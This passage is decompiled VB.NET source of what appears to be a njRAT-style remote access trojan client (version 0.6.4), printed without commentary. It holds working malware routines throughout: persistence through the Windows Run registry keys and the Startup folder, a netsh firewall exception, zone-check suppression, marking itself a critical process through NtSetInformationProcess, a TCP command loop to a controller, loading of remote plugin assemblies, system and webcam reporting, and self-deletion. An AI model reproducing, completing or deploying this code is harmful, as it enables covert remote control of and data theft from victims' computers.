                ProjectData.SetProjectError(exception11)
                Dim exception5 As Exception = exception11
                str2 = (str2 & "0")
                ProjectData.ClearProjectError()
            End Try
            Try
                If Environment.GetFolderPath(SpecialFolder.ProgramFiles).Contains("x86") Then
                    str2 = (str2 & " x64" & OK.Y)
                Else
                    str2 = (str2 & " x86" & OK.Y)
                End If
            Catch exception12 As Exception
                ProjectData.SetProjectError(exception12)
                Dim exception6 As Exception = exception12
                str2 = (str2 & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            If OK.Cam Then
                str2 = (str2 & "Yes" & OK.Y)
            Else
                str2 = (str2 & "No" & OK.Y)
            End If
            str2 = (((str2 & OK.VR & OK.Y) & ".." & OK.Y) & OK.ACT & OK.Y)
            Dim str3 As String = ""
            Try
                Dim str4 As String
                For Each str4 In OK.F.Registry.CurrentUser.CreateSubKey(("Software\" & OK.RG), RegistryKeyPermissionCheck.Default).GetValueNames
                    If (str4.Length = &H20) Then
                        str3 = (str3 & str4 & ",")
                    End If
                Next
            Catch exception13 As Exception
                ProjectData.SetProjectError(exception13)
                Dim exception7 As Exception = exception13
                ProjectData.ClearProjectError()
            End Try
            Return (str2 & str3)
        End Function

        Public Shared Sub INS()
            If (OK.Idr AndAlso Not OK.CompDir(OK.LO, New FileInfo((Interaction.Environ(OK.DR).ToLower & "\" & OK.EXE.ToLower)))) Then
                Try
                    If File.Exists((Interaction.Environ(OK.DR) & "\" & OK.EXE)) Then
                        File.Delete((Interaction.Environ(OK.DR) & "\" & OK.EXE))
                    End If
                    File.Copy(OK.LO.FullName, (Interaction.Environ(OK.DR) & "\" & OK.EXE), True)
                    Process.Start((Interaction.Environ(OK.DR) & "\" & OK.EXE))
                    ProjectData.EndApp()
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.EndApp()
                    ProjectData.ClearProjectError()
                End Try
            End If
            Try
                Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Dim exception2 As Exception = exception7
                ProjectData.ClearProjectError()
            End Try
            Try
                Interaction.Shell(String.Concat(New String() {"netsh firewall add allowedprogram """, OK.LO.FullName, """ """, OK.LO.Name, """ ENABLE"}), AppWinStyle.Hide, False, -1)
            Catch exception8 As Exception
                ProjectData.SetProjectError(exception8)
                Dim exception3 As Exception = exception8
                ProjectData.ClearProjectError()
            End Try
            If OK.Isu Then
                Try
                    OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                Catch exception9 As Exception
                    ProjectData.SetProjectError(exception9)
                    Dim exception4 As Exception = exception9
                    ProjectData.ClearProjectError()
                End Try
                Try
                    OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                Catch exception10 As Exception
                    ProjectData.SetProjectError(exception10)
                    Dim exception5 As Exception = exception10
                    ProjectData.ClearProjectError()
                End Try
            End If
            If OK.IsF Then
                Try
                    File.Copy(OK.LO.FullName, (Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG & ".exe"), True)
                    OK.FS = New FileStream((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG & ".exe"), FileMode.Open)
                Catch exception11 As Exception
                    ProjectData.SetProjectError(exception11)
                    Dim exception6 As Exception = exception11
                    ProjectData.ClearProjectError()
                End Try
            End If
            Thread.Sleep(&H3E8)
        End Sub

        <DllImport("ntdll")> _
        Private Shared Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
        End Function

        Public Shared Function Plugin(ByVal ByteOfPlugin As Byte(), ByVal ClassName As String) As Object
            Dim [module] As [Module]
            For Each [module] In Assembly.Load(ByteOfPlugin).GetModules
                Dim type As Type
                For Each type In [Module].GetTypes
                    If type.FullName.EndsWith(("." & ClassName)) Then
                        Return [Module].Assembly.CreateInstance(type.FullName)
                    End If
                Next
            Next
            Return Nothing
        End Function

        Public Shared Sub pr(ByVal i As Integer)
            Try
                OK.NtSetInformationProcess(Process.GetCurrentProcess.Handle, &H1D, i, 4)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Sub RC()
Label_0000:
            If (Not OK.C Is Nothing) Then
                Try
Label_000C:
                    If Not OK.Cn Then
                        GoTo Label_01B9
                    End If
                    If (OK.C.Available > 0) Then
                        OK.b = New Byte(((OK.C.Client.Available - 1) + 1) - 1) {}
                        Dim count As Integer = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None)
                        If (count <= 0) Then
                            GoTo Label_01B9
                        End If
                        OK.MeM.Write(OK.b, 0, count)
                        Do While True
                            If Not OK.BS(OK.MeM.ToArray).Contains(OK.SPL) Then
                                GoTo Label_019D
                            End If
                            Dim instance As Array = OK.fx(OK.MeM.ToArray, OK.SPL)
                            Dim thread As New Thread(New ParameterizedThreadStart(AddressOf OK._Lambda__3))
                            Thread.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(instance, New Object() {0}, Nothing)))
                            Thread.Join(200)
                            OK.MeM.Dispose()
                            OK.MeM = New MemoryStream
                            If (instance.Length <> 2) Then
                                GoTo Label_019D
                            End If
                            OK.MeM.Write(DirectCast(NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing), Byte()), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(instance, New Object() {1}, Nothing), Nothing, "length", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))
                        Loop
                    End If
                    Dim num2 As Integer = OK.C.GetStream.ReadByte
                    If (num2 = -1) Then
                        GoTo Label_01B9
                    End If
                    OK.MeM.WriteByte(CByte(num2))
Label_019D:
                    Thread.Sleep(1)
                    GoTo Label_000C
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                End Try
            End If
Label_01B9:
            OK.Cn = False
            Thread.Sleep(&H9C4)
            If Not OK.connect Then
                GoTo Label_01B9
            End If
            OK.Cn = True
            GoTo Label_0000
        End Sub

        Public Shared Function RN(ByVal c As Integer) As String
            VBMath.Randomize()
            Dim random As New Random
            Dim str3 As String = ""
            Dim str As String = "abcdefghijklmnopqrstuvwxyz"
            Dim num2 As Integer = c
            Dim i As Integer = 1
            Do While (i <= num2)
                str3 = (str3 & Conversions.ToString(str.Chars(random.Next(0, str.Length))))
                i += 1
            Loop
            Return str3
        End Function

        Private Shared Sub RS(ByVal a As Object, ByVal e As Object)
            Try
                Dim instance As Object = e
                Dim s As String = Conversions.ToString(NewLateBinding.LateGet(instance, Nothing, "Data", New Object(0 - 1) {}, Nothing, Nothing, Nothing))
                NewLateBinding.LateSetComplex(instance, Nothing, "Data", New Object() {s}, Nothing, Nothing, True, False)
                OK.Send(("rs" & OK.Y & OK.ENB(s)))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Function SB(ByRef S As String) As Byte()
            Return Encoding.Default.GetBytes(S)
        End Function

        Public Shared Function Send(ByVal S As String) As Boolean
            Return OK.Sendb(OK.SB(S))
        End Function

        Public Shared Function Sendb(ByVal b As Byte()) As Boolean
            Dim flag As Boolean
            If Not OK.Cn Then
                Return False
            End If
            Dim lO As FileInfo = OK.LO
            SyncLock lO
                If Not OK.Cn Then
                    flag = False
                Else
                    Try
                        Dim stream As New MemoryStream
                        stream.Write(b, 0, b.Length)
                        stream.Write(OK.SB(OK.SPL), 0, OK.SPL.Length)
                        OK.C.Client.Send(stream.ToArray, 0, CInt(stream.Length), SocketFlags.None)
                        stream.Dispose()
                        flag = True
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Dim exception As Exception = exception1
                        Try
                            If OK.Cn Then
                                OK.C.Close()
                            End If
                        Catch exception3 As Exception
                            ProjectData.SetProjectError(exception3)
                            Dim exception2 As Exception = exception3
                            ProjectData.ClearProjectError()
                        End Try
                        OK.Cn = False
                        flag = False
                        ProjectData.ClearProjectError()
                    End Try
                End If
            End SyncLock
            Return flag
        End Function

        Public Shared Function STV(ByVal n As String, ByVal t As String) As Object
            Dim obj2 As Object
            Try
                OK.F.Registry.CurrentUser.CreateSubKey(("Software\" & OK.RG)).SetValue(n, t)
                obj2 = True
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                obj2 = False
                ProjectData.ClearProjectError()
            End Try
            Return obj2
        End Function

        Public Shared Sub UNS()
            OK.pr(0)
            Try
                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).DeleteValue(OK.RG, False)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Try
                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).DeleteValue(OK.RG, False)
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Dim exception2 As Exception = exception7
                ProjectData.ClearProjectError()
            End Try
            Try
                Interaction.Shell(("netsh firewall delete allowedprogram """ & OK.LO.FullName & """"), AppWinStyle.Hide, False, -1)
            Catch exception8 As Exception
                ProjectData.SetProjectError(exception8)
                Dim exception3 As Exception = exception8
                ProjectData.ClearProjectError()
            End Try
            Try
                If (Not OK.FS Is Nothing) Then
                    OK.FS.Dispose()
                    File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG & ".exe"))
                End If
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception4 As Exception = exception9
                ProjectData.ClearProjectError()
            End Try
            Try
                OK.F.Registry.CurrentUser.OpenSubKey("Software", True).DeleteSubKey(OK.RG, False)
            Catch exception10 As Exception
                ProjectData.SetProjectError(exception10)
                Dim exception5 As Exception = exception10
                ProjectData.ClearProjectError()
            End Try
            Try
                Interaction.Shell(("cmd.exe /c ping 127.0.0.1 & del """ & OK.LO.FullName & """"), AppWinStyle.Hide, False, -1)
            Catch exception11 As Exception
                ProjectData.SetProjectError(exception11)
                Dim exception6 As Exception = exception11
                ProjectData.ClearProjectError()
            End Try
            ProjectData.EndApp()
        End Sub

        Public Shared Function ZIP(ByVal B As Byte(), ByRef CM As Boolean) As Byte()
            If CM Then
                Dim stream2 As New MemoryStream
                Dim stream As New GZipStream(stream2, CompressionMode.Compress, True)
                stream.Write(B, 0, B.Length)
                stream.Dispose()
                stream2.Position = 0
                Dim buffer2 As Byte() = New Byte((CInt(stream2.Length) + 1) - 1) {}
                stream2.Read(buffer2, 0, buffer2.Length)
                stream2.Dispose()
                Return buffer2
            End If
            Dim stream4 As New MemoryStream(B)
            Dim stream3 As New GZipStream(stream4, CompressionMode.Decompress)
            Dim buffer As Byte() = New Byte(4 - 1) {}
            stream4.Position = (stream4.Length - 5)
            stream4.Read(buffer, 0, 4)
            Dim count As Integer = BitConverter.ToInt32(buffer, 0)
            stream4.Position = 0
            Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
            stream3.Read(array, 0, count)
            stream3.Dispose()
            stream4.Dispose()
            Return array
        End Function


        ' Fields
        Private Shared b As Byte() = New Byte(&H1401 - 1) {}
        Public Shared BD As Boolean = Conversions.ToBoolean("[BD]")
        Public Shared C As TcpClient = Nothing
        Public Shared Cn As Boolean = False
        Public Shared DR As String = "[DR]"
        Public Shared EXE As String = "[EXE]"
        Public Shared F As Computer = New Computer
        Public Shared FS As FileStream
        Public Shared H As String = "[H]"
        Public Shared Idr As Boolean = Conversions.ToBoolean("[Idr]")
        Public Shared IsF As Boolean = Conversions.ToBoolean("[Isf]")
        Public Shared Isu As Boolean = Conversions.ToBoolean("[Isu]")
        Public Shared kq As kl = Nothing
        Private Shared lastcap As String = ""
        Public Shared LO As FileInfo = New FileInfo(Application.ExecutablePath)
        Private Shared MeM As MemoryStream = New MemoryStream
        Public Shared MT As Mutex = Nothing
        Public Shared P As String = "[P]"
        Private Shared Pro As Process
        Public Shared RG As String = "[RG]"
        Public Shared sf As String = "Software\Microsoft\Windows\CurrentVersion\Run"
        Public Shared SPL As String = "[endof]"
        Public Shared VN As String = "[VN]"
        Public Shared VR As String = "0.6.4"
        Public Shared Y As String = "|'|'|"
    End Class
End Namespace

